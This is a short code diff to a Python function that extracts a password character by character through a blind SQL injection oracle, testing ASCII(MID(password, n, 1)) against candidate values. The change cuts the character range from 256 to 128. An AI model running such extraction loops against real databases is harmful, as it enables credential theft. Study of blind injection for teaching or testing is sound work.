@@ -41,7 +41,7 @@ def iterative():
     num_requests = 0
 
     for index in range(1, PWD_LENGTH + 1):
-        for char in range(256):
+        for char in range(128):
             num_requests += 1
             if oracle("ASCII(MID(password, %d, 1)) = %d" % (index, char)):
                 password += chr(char)
